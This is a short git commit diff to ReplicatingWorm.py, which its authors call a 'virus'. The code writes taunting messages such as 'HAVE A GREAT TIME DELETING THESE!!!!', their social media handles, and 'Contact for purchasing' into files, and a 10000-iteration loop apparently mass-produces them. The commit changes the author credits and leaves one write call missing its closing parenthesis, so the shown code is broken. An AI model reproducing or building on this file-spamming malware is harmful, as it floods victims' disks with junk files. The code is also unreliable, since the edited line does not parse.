1f6ca4b15abf5ba1825731664a4d22bc58fd4bb2
Jas Arora <81324353+arorajas99@users.noreply.github.com>
2022-09-19 19:33:18 +0530

    Update ReplicatingWorm.py

--- ReplicatingWorm.py
+++ ReplicatingWorm.py
@@ -12,8 +12,7 @@ def replicating ():
         file1.write('HAVE A GREAT TIME DELETING THESE!!!! HUEHUEHUEHUE\n')
         file1.write(       'Virus made by:-\n')
         file1.write(        'Jap® and Jas®   (Patent Pending...)\n')
-        file1.write(        'Instagram : @arorajas99      https://www.instagram.com/arorajas99/\n')
-        file1.write(        '            @_.jap_codez_     https://www.instagram.com/_.jap_codez_/\n')
+        file1.write(        'Instagram : @arorajas99      https://www.instagram.com/arorajas99/\n'
         file1.write("                   Contact for purchasing")
 
 for i in range (10000):
